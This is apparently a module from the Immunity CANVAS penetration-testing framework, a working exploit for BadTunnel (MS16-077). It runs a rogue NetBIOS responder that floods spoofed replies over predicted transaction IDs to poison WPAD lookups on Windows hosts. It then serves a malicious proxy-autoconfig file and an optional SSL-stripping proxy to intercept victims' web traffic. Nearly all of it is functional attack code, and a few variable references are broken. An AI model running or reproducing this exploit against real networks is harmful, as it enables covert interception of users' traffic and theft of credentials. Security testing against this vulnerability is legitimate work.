#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2016
#http://www.immunityinc.com/CANVAS/ for more information

NAME                            = 'Badtunnel (MS16-077)'
DESCRIPTION                     = 'NetBios Name Resolver Predictable TXID'
DOCUMENTATION                   = {}
DOCUMENTATION['Date public']    = ''
DOCUMENTATION['CVE Name']       = 'CVE-2016-3236, CVE-2016-3213'
DOCUMENTATION['CVE Url']        = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3236, https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3213'
DOCUMENTATION['Repeatability']  = ''
DOCUMENTATION['References']     = ['http://xlab.tencent.com/en/2016/06/17/BadTunnel-A-New-Hope/','https://www.blackhat.com/docs/us-16/materials/us-16-Yu-BadTunnel-How-Do-I-Get-Big-Brother-Power-wp.pdf']
DOCUMENTATION['NOTES']          = """
USER NOTE: IT IS BEST TO USE YOUR OWN SSL-STRIPPING PROXY SERVER WITH THIS MODULE!
           If you are feeling bold, you may set self.use_spike_interceptor to True.
           By default we will use <ip of current callback interface>:8080
USER NOTE: this module must be run with Canvas running as root!
USER NOTE: this module must be run from ClientD!
USER NOTE: if you wish to sniff while MITM'ing with different SSL certificates,
           you will need to add a call to app.setCACert() and app.setCAKey() with
           the path of the certificate and key you wish to use.
USER NOTE: if the exploit is to run against a network where presumably there are
           many NB name resolutions, increase txid_window to be an order of magnitude
           or more larger to be safe.

This module lets us view all of the web traffic of a remote computer running Windows.

When an external server connects to us, we receive a NB name request for '*'
with a TXID that is incremented for every subsequent request. Using that information,
we can send a small buffer of packets (think 16 as opposed to 2**16), that will
likely poison a response to a WPAD name resolution depending on the number of NB name
resolves sent from that host.

Serve your own WPAD via the HTTPSERVER module listening on port 80. Make the WPAD file
point to a proxy under your control.

The server *must* listen on UDP port 137 or the responses will not be read correctly by
the target.

Tested on:
Windows 10 x86_64

"""
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Servers'
VERSION                         = '0.1'


import sys
if '.' not in sys.path:
    sys.path.append('.')

from httpclientside import httpclientside
from libs.spkproxy import header, body
from libs.ua_parser import user_agent_parser
import canvasengine
from exploitutils import *

import struct
import socket
import select
from multiprocessing import Process
import os
import nmb
import libs.spkproxy as spkproxy

import logging


def nbt_sweeper(wpad_server_ip, address, port, txid_window):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    for response in make_response_set(wpad_server_ip, txid-txid_window, txid+txid_window):
        s.sendto(response, (address, port))

    time.sleep(3)

def run_evil_nbt_server(nbt_ip, wpad_server_ip, txid_window):
    # NOTE: while it would be awesome to make this multithreaded, we must make the
    # replies come from port 137. To do so we need to use the same socket as the server
    # because otherwise we will be assigned a different port by the os.

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # NN: make this select the IP from the LocalNode
    s.bind((nbt_ip, 137))
    s.setblocking(0)

    sockets = [s]
    writers = []
    txid_map = {}
    thread_map = {}

    ready_to_read = None
    ready_to_write = None
    in_error = None

    while True:
        try:
            ready_to_read, ready_to_write, in_error = select.select(sockets, sockets, sockets, 3)
        except select.error as e:
            sockets[0].close()

            break
        else:
            if len(ready_to_read) != 0:
                (data, address) = s.recvfrom(1024)

                # Do we have a legitimate NB query for '*' headed our way?
                if (decide_nbdns_nbt_request(data)):
                    txid = struct.unpack(">H", data[0:2])[0]
                    name_length = ord(data[12])

                    try:
                        length, name, scope = nmb.decode_name(data[12:])
                        if name.startswith("*"):
                            if address not in txid_map:
                                txid_map[address] = txid
                            else:
                                txid_diff = txid_map[address] - txid

                                if (txid_diff < -3) or (txid_diff > 3):
                                    txid_map[address] = txid
                    except Exception as e:
                        pass

            if len(ready_to_write) != 0:
                for (found_address, txid) in txid_map.iteritems():
                    # self.log_info("sending windows of txid responses to: %s (TXID:%d)" % (str(address[0])
                    for response in make_response_set(wpad_server_ip, txid-txid_window, txid+txid_window):
                        s.sendto(response, (address[0], address[1]))

            time.sleep(3)


def decide_nbdns_nbt_request(data):
    return data.endswith("\x00\x20\x00\x01") or data.endswith("\x00\x21\x00\x01")

nb_response = "".join([chr(x) for x in [
                    0x85, 0x00, \
                    0x00, 0x00, \
                    0x00, 0x01, \
                    0x00, 0x00, \
                    0x00, 0x00, \
                    0x20, \
                    0x46, 0x48, 0x46, \
                    0x41, 0x45, 0x42, 0x45, 0x45, 0x43, 0x41, 0x43, \
                    0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, \
                    0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, \
                    0x41, 0x43, 0x41, 0x41, 0x41, \
                    0x00, \
                    0x00, 0x20, \
                    0x00, 0x01, \
                    0xff,0xff,0xff, \
                    0xff, \
                    0x00, 0x12, ] ])

def make_response_set(ip_address, txid_lower, txid_upper):
    global nb_response

    ip_block = (("\x00\x00" + "".join([chr(int(x.strip())) for x in ip_address.split(".")]))*3)
    post_txid = nb_response + ip_block


    for txid in range(txid_lower, txid_upper+1):
        yield struct.pack(">H", txid) + post_txid

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.setVersions()
        self.name = NAME
        self.version = 1

        self.html_data = None
        self.wpad_data = None
        return

    def setVersions(self):
        self.versions = {}
        self.versions[1] = ("Windows - all versions", None)

    def test(self):
        return False

    def neededListenerTypes(self):
        return []

    def setup_memoized(self):
        if self.wpad_data == None or self.html_data == None:
            # Setup variables needed for the WPAD server to work
            with open(os.path.join(os.path.dirname(__file__), "Resources/wpad.dat"), "rb") as handle:
                wpad_data_template = handle.read()
                self.wpad_data = wpad_data_template % (self.proxy_ip, self.proxy_port)

            # Setup variables needed for the malicious web page to work
            with open(os.path.join(os.path.dirname(__file__), "Resources/visit.html"), "rb") as handle:
                html_template = handle.read()
                self.html_data = html_template % self.nbt_ip

    def makesploit(self, clientheader, clientbody):
        self.getargs()
        self.setup_memoized()

        h = header("SERVER")
        b = body()
        user_agent = clientheader.getStrValue(["User-Agent"])

        if clientheader.URL.lower().strip().endswith("wpad.dat"):
            b.setBody(self.wpad_data)
            h.addHeader("Content-type", "application/x-ns-proxy-autoconfig")
        else:
            b.setBody(self.html_data)

        h.addHeader("Connection", "Close")

        return h, b

    def setup_out_proxy(self):
        app = self.engine.getModuleExploit("spikeproxy")
        app.link(self)

    def getargs(self):
        # Note: as we don't actually take configuration values from the UI,
        # they are set statically here.
        local_node = self.engine.getLocalNode()
        self.local_ip = str(local_node.interfaces.get_callback_interface())

        self.wpad_ip        = self.local_ip
        self.nbt_ip         = self.local_ip

        # NOTE: a proxy (preferably one that strips SSL) should be
        # listening on this IP:PORT. By default the proxy that you set
        # up should be setup on the callback IP address. Uncomment
        # the line below to specify your own IP manually.
        self.proxy_ip       = self.local_ip
        # self.proxy_ip       = "31.33.07.01"


        self.use_spike_interceptor = False
        # proxy_port can reasonably be changed
        self.proxy_port = 8080

        # ... but the WPAD server port cannot be.
        self.wpad_port = 80
        # self.wpad_port = 8081

        # ... nor can the NBT server port.
        self.nbt_port = 137

        # Given a leaked TXID, send out a packet for each txid in
        # [txid-txid_window, .., leaked_txid, .., txid+txid_window]
        self.txid_window = 15

    def clientd_init(self):
        self.getargs()

        # Setup SPIKE proxy in another process
        def run_spike_proxy(interface_ip, port):
            from libs.spkproxy import spkProxy
            app = spkProxy()
            app.setPort(port)
            app.setListenHost(interface_ip)
            app.run()

        def run_null_proxy(interface_ip, port):
            return

        proxy_setup = run_null_proxy
        if self.use_spike_interceptor:
            proxy_setup = run_spike_proxy

        spike_process = Process(target=proxy_setup, args=(self.proxy_ip, self.proxy_port))
        spike_process.start()

        # Setup netbios poisoning process
        nbt_process = Process(target=run_evil_nbt_server, args=(self.nbt_ip,
                                                                self.wpad_ip,
                                                                self.txid_window))
        nbt_process.start()

        def module_monitor(_self, _nbt_process, _spike_process):
            global NAME

            while True:
                time.sleep(1)
                if _self.getState() == _self.HALT:
                    logging.warning("Badtunnel exploit told to exit")
                    _self.setInfo("(%s) - done (finished)" % NAME)
                    _nbt_process.terminate()
                    _spike_process.terminate()
                    break

        threading.Thread(target=module_monitor, args=(self, nbt_process, spike_process)).start()

    def is_vulnerable(self, info_dict):
        # Note: this says 'attack every windows box'. This may be too permissive.
        user_agent = user_agent_parser.Parse(info_dict["user_agent"])

        return int('Windows' not in user_agent['os']['family'])
